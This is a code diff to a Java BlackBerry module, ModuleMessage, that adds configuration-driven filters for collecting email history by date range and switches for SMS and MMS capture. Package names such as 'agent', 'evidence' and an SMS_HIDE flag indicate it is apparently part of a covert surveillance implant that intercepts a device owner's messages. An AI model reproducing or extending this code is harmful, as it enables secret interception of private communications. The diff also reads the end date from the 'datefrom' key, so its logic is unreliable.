@@ -18,8 +18,8 @@ import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.util.DataBuffer;
-import net.rim.device.api.util.IntHashtable;
 import blackberry.ModuleManager;
+import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.Mail;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.mail.MailParser;
@@ -27,7 +27,9 @@ import blackberry.agent.mail.Prefix;
 import blackberry.agent.sms.SmsListener;
 import blackberry.agent.sms.SmsListener45;
 import blackberry.agent.sms.SmsListener46;
+import blackberry.config.ChildConf;
 import blackberry.config.ConfModule;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -80,6 +82,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     boolean mailEnabled;
     boolean smsEnabled;
+    boolean mmsEnabled;
 
     MailListener mailListener;
     SmsListener smsListener;
@@ -88,21 +91,26 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     //public Date lastcheck = new Date(0);
 
     protected String identification;
-    public IntHashtable filtersSMS = new IntHashtable();
-    public IntHashtable filtersMMS = new IntHashtable();
-    public IntHashtable filtersEMAIL = new IntHashtable();
+    //public IntHashtable filtersSMS = new IntHashtable();
+    //public IntHashtable filtersMMS = new IntHashtable();
+    Filter filterEmailCollect;
+    Filter filterEmailRuntime;
 
     boolean firstRun;
     Thread historyThread = null;
+    private boolean mailHistory;
+
+    private Date mailFrom;
+    private Date mailTo;
 
     public static String getStaticType() {
         return "messages";
     }
-    
+
     public static ModuleMessage getInstance() {
         return (ModuleMessage) ModuleManager.getInstance().get(getStaticType());
     }
-    
+
     /**
      * Instantiates a new message agent.
      * 
@@ -110,14 +118,14 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      *            the agent status
      */
     public ModuleMessage() {
-    
+
         markupDate = new TimestampMarkup("message");
 
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
-    
+
         mailListener = MailListener.getInstance();
-    
+
         //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
         //#else
@@ -125,11 +133,36 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //#endif
         //smsListener.setMessageAgent(this);
     }
-    
+
     //TODO da riempire il parse
     public boolean parse(ConfModule conf) {
         setPeriod(NEVER);
         setDelay(100);
+
+        try {
+            ChildConf mailJson = conf.getChild("mail");
+            mailEnabled = mailJson.getBoolean("enabled");
+            ChildConf mailFilter = mailJson.getChild("filter");
+            mailHistory = mailFilter.getBoolean("history");
+            mailFrom = mailFilter.getDate("datefrom");
+            mailTo = mailFilter.getDate("datefrom");
+
+            int maxSizeToLog = 4096;
+            filterEmailCollect = new Filter(mailHistory, mailFrom, mailTo,
+                    maxSizeToLog, maxSizeToLog);
+            filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
+
+            ChildConf smsJson = conf.getChild("sms");
+            smsEnabled = smsJson.getBoolean("enabled");
+
+            ChildConf mmsJson = conf.getChild("mms");
+            mmsEnabled = mmsJson.getBoolean("enabled");
+        } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse");
+            //#endif
+        }
 
         return true;
     }
@@ -217,7 +250,6 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             ;
         }
     }
-
 
     private boolean haveNewAccount() {
         return mailListener.haveNewAccount();
@@ -619,6 +651,12 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
     }
 
+    public Filter getFilterEmailRealtime() {
+        return filterEmailRuntime;
+    }
 
+    public Filter getFilterEmailCollect() {
+        return filterEmailCollect;
+    }
 
 }
